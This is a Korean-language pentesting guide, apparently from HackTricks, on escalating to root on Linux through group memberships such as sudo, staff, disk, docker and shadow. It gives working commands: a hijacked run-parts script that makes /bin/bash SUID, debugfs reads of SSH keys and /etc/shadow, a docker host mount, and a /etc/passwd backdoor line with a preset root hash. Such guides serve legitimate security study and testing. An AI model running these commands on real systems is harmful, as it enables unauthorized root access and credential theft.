# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin 그룹

### **PE - Method 1**

**때때로**, 시스템의 **/etc/sudoers** 정책(또는 해당 정책에서 include된 파일)에는 다음과 같은 항목이 포함되어 있습니다:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이는 두 항목 중 어느 하나에라도 해당하는 사용자가 `sudo`를 통해 모든 대상 사용자로서 모든 명령을 실행할 수 있다는 의미입니다(나머지 정책의 적용을 받음).<sup>[[3]](#references)</sup>

이 경우 **root가 되려면 다음을 실행하기만 하면 됩니다**:
```
sudo su
```
### PE - Method 2

모든 suid 바이너리를 찾고 **Pkexec** 바이너리가 있는지 확인합니다:
```bash
find / -perm -4000 2>/dev/null
```
**pkexec가 SUID 바이너리인 경우**, polkit이 요청된 action을 authorize한 경우에만 다른 user로 프로그램을 실행할 수 있습니다. SUID bit만으로 root 권한이 보장되는 것은 아닙니다. **sudo** 또는 **admin** 멤버십만으로 충분하다고 가정하지 말고, 설치된 policy와 대상 session의 authorization을 확인하세요.<sup>[[4]](#references)[[5]](#references)</sup>

여전히 이전 Local Authority backend를 사용하는 distribution에서는 다음 명령으로 group rule을 확인하세요:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
관련 그룹 이름과 기본값은 배포판마다 다릅니다. 여기서 그룹은 로컬 정책에 해당 그룹이 지정되어 있는 경우에만 유용합니다.<sup>[[5]](#references)</sup>

**root가 되려면 다음을 실행할 수 있습니다**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
**pkexec**를 실행하려고 했는데 다음과 같은 **error**가 발생한다면:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
등록된 authentication agent가 없는 SSH 세션에서는 정책상 해당 작업이 허용되더라도 `pkexec`가 다음 오류와 함께 실패할 수 있습니다. polkit은 데스크톱이 아닌 세션에서 사용할 텍스트 authentication agent로 `pkttyagent`를 문서화하고 있습니다. 정확한 동작은 버전 및 배포판에 따라 다르므로 로컬 정책과 agent 설정을 확인해야 합니다. 영향을 받는 NixOS 버전에서 보고된 한 가지 우회 방법은 **서로 다른 2개의 SSH 세션**을 사용하는 것입니다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

때때로 sudoers 정책에는 다음 항목도 포함될 수 있습니다:
```
%wheel	ALL=(ALL:ALL) ALL
```
이는 해당 항목과 일치하는 모든 사용자가 `sudo`를 통해 대상 사용자로서 어떤 명령이든 실행할 수 있다는 의미입니다(정책의 나머지 조건에 따름).<sup>[[3]](#references)</sup>

이 경우 **root가 되려면 다음을 실행하기만 하면 됩니다**:
```
sudo su
```
## Shadow 그룹

권한이 허용되는 시스템에서는 **shadow** 그룹의 사용자가 **/etc/shadow**를 **읽을** 수 있습니다. 대상 시스템에서 실제 모드와 ACL을 확인하세요:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
그러니 파일을 읽고 **일부 hashes를 crack해 보세요**.

hashes를 분류할 때 알아둘 간단한 lock 상태 관련 사항:
- `!` 또는 `*`가 포함된 항목은 일반적으로 password login에서 비대화형입니다.
- `!hash`는 password가 lock되었음을 의미하며, 나머지 문자는 lock되기 전 password field를 나타냅니다.
- `*`가 포함된 field는 유효한 `crypt(3)` hash가 아니며 UNIX-password login을 방지합니다. 이를 통해 password가 이전에 설정되었는지는 판단하지 마세요.
이는 direct login이 차단된 경우에도 account classification에 유용합니다.<sup>[[6]](#references)</sup>

## Staff 그룹

**staff**: 사용자가 root privileges 없이 시스템(`/usr/local`)에 local modifications를 추가할 수 있도록 합니다(`/usr/local/bin`의 executables는 모든 사용자의 PATH variable에 포함되며, 같은 이름의 `/bin` 및 `/usr/bin` executables를 "override"할 수 있다는 점에 유의하세요). monitoring/security와 더 관련이 있는 "adm" 그룹과 비교해 보세요.<sup>[[2]](#references)[[7]](#references)</sup>

`PATH`에서 `/usr/local/bin`이 `/usr/bin`보다 앞서는 Debian configurations(아래 examples와 같음)에서는 unqualified command가 먼저 `/usr/local/bin`의 copy로 resolve됩니다. target에서 실제 `PATH`를 확인하세요.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
권한이 높은 프로세스가 쓰기 가능한 `/usr/local/bin`을 통해 정규화되지 않은 명령을 확인하는 경우, 해당 명령을 교체하면 프로세스의 권한으로 실행될 수 있습니다. 테스트하기 전에 실제 경로와 트리거를 확인하세요.

Ubuntu 시스템에서는 로그인 시 `pam_motd`가 root로 `run-parts --lsbsysinit`를 통해 실행 가능한 스크립트를 실행합니다. cron 작업에서도 `run-parts`를 사용할 수 있지만, 이는 배포판과 구성에 따라 다릅니다.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
새로운 SSH 로그인 시 `pspy`를 사용하면 대상에서 이 경로가 실제로 호출되는지 확인하는 데 도움이 되며, root 권한 없이 프로세스 명령줄을 관찰할 수 있습니다.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

**disk** 그룹의 구성원은 블록 디바이스에 대한 원시 액세스 권한을 얻을 수 있으며, **root 액세스 권한에 가까운 경우가 많습니다**. Debian에서는 이를 대부분 root와 동등한 권한으로 설명하지만, 대상 시스템에서 실제 디바이스 권한과 스토리지 구성을 확인해야 합니다.<sup>[[7]](#references)</sup>

일반적인 디바이스 경로로는 `/dev/sd*` 등이 있지만, NVMe 및 기타 스토리지 구성에서는 다른 이름을 사용합니다.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs`는 ext2/ext3/ext4 파일시스템에서 작동합니다. 위의 `/root` 및 `/etc/shadow`와 같은 경로는 열린 파일시스템 내부의 파일이며, `dump`의 두 번째 인수는 native filesystem의 출력 경로입니다.<sup>[[8]](#references)</sup> 예를 들어, 다음 명령은 열린 파일시스템에서 `/tmp/asd1.txt`를 추출하여 native filesystem의 `/tmp/asd2.txt`에 저장합니다:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
`-w` 옵션은 파일시스템을 읽기-쓰기로 열고, `write` 명령은 네이티브 파일을 열린 파일시스템으로 복사합니다. 직접 수정하면 파일시스템이 손상될 수 있으므로 마운트된 live 파일시스템에서 사용하지 말고, 가능하면 offline 이미지에서 작업하세요.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video 그룹

`w` 명령을 사용하면 **시스템에 로그인한 사용자**를 확인할 수 있으며, 다음과 같은 출력이 표시됩니다.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 항목은 첫 번째 Linux virtual console을 식별하지만, 그 자체만으로 사용자가 물리적으로 장치 앞에 있다는 것을 증명하지는 않습니다. 특히 container 또는 기타 환경에서는 더욱 그렇습니다.<sup>[[21]](#references)</sup>

읽을 수 있는 framebuffer device를 노출하는 시스템에서는 **video** group의 membership이 해당 device에 대한 access 권한을 부여할 수 있습니다. Linux framebuffer interface 문서에서는 `/dev/fb0`를 화면 스냅샷을 위해 복사할 수 있는 읽기 가능한 memory device로 설명합니다. `/sys/class/graphics/fb0/virtual_size` path는 해당 fbdev sysfs attribute가 존재하는 경우에만 사용할 수 있으므로, 먼저 target을 확인해야 합니다.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
설치된 **GIMP** 버전에서 raw-data importer를 지원하는 경우, 해당 importer로 **`screen.raw`**를 엽니다. 지원 형식과 조작 방법은 버전 및 plug-in에 따라 다릅니다.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Raw image를 열려면 GIMP를 사용할 수 있습니다. screen.raw 파일을 선택하고 파일 형식으로 Raw image data를 선택합니다.](<../../../images/image (463).png>)

이미지 Width와 Height를 framebuffer geometry에 맞게 설정하고, 출력 내용을 읽을 수 있을 때까지 사용 가능한 pixel formats/Image Types를 시도합니다.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: 그런 다음 화면에서 사용되는 Width와 Height로 변경하고 여러 Image Types를 확인합니다(화면이 가장 잘 표시되는 항목을 선택).](<../../../images/image (317).png>)

## Root Group

**root** 그룹의 구성원이라고 해서 root의 UID가 부여되는 것은 아니지만, 권한 있는 서비스나 라이브러리가 사용하는 경우 `root`가 소유한 group-writable 파일이 여전히 흥미로운 대상이 될 수 있습니다. 해당 파일을 privilege-escalation 경로로 간주하기 전에 실제 권한과 사용 방식을 확인하세요.

**root 구성원이 수정할 수 있는 파일 확인**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker 그룹

표준 rootful 설치에서 `docker` 그룹의 구성원은 Docker daemon에 대한 root 수준의 접근 권한을 얻습니다. bind mount는 기본적으로 read-write이므로, 해당 daemon을 제어할 수 있는 사용자는 호스트의 `/`를 컨테이너에 mount하고 호스트 파일을 변경할 수 있습니다. 이는 사실상 호스트에서 root 권한을 얻는 것과 같습니다.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
마지막으로, 앞서 제안한 방법이 마음에 들지 않거나 어떤 이유로 작동하지 않는 경우(예: docker api firewall?)에는 언제든지 **privileged container를 실행하고 그곳에서 escape**를 시도할 수 있습니다. 자세한 내용은 다음을 참고하세요:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socket에 대한 쓰기 권한이 있다면 [**docker socket을 악용하여 privileges를 escalate하는 방법에 관한 이 글**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**을 읽어보세요.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

일반적으로 **`adm`** 그룹의 **members**는 _/var/log/_ 내부에 있는 **log** 파일을 **read**할 수 있는 권한을 가집니다.\
따라서 이 그룹에 속한 사용자를 compromised했다면 반드시 **logs를 확인**해야 합니다.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

이러한 그룹은 service 및 distribution에 따라 의미가 다릅니다. Debian에서는 `backup`을 위임된 backup/restore용으로, `lp`를 printer daemon용으로, `mail`을 `/var/mail`용으로 설명하므로, 그룹 멤버십을 privilege path로 간주하기 전에 로컬 permissions를 확인하세요.<sup>[[7]](#references)</sup>

이 그룹들은 직접적인 root vectors라기보다는 **credential-discovery** vectors인 경우가 많습니다:
- **backup**: configs, keys, DB dumps 또는 tokens가 포함된 archives를 노출할 수 있습니다.
- **operator**: 민감한 runtime data를 leak할 수 있는 platform-specific operational access를 제공합니다.
- **lp**: print queues/spools에 document contents가 포함될 수 있습니다.
- **mail**: mail spools를 통해 reset links, OTPs 및 internal credentials가 노출될 수 있습니다.

이러한 그룹의 멤버십을 high-value data exposure finding으로 간주하고 password/token reuse를 통해 pivot하세요.

## Auth group

OpenBSD에서 S/Key가 구성된 경우 `/etc/skey`는 `root:auth`가 소유하며 해당 records에 접근하려면 `auth` 그룹이 필요합니다. YubiKey records는 `/var/db/yubikey`에 저장됩니다.<sup>[[16]](#references)[[17]](#references)</sup> S/Key 또는 YubiKey가 활성화된 취약한 OpenBSD 6.6 구성에서는 `auth` privileges를 가진 local users가 root가 될 수 있었습니다. Qualys는 prerequisite와 exploit chain을 문서화했으며, 연결된 PoC가 이를 구현합니다.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI session 없이 pkexec/pkttyagent authentication (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Securing Debian Manual](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [The Frame Buffer Device — The Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Manage Docker as a non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentication vulnerabilities in OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
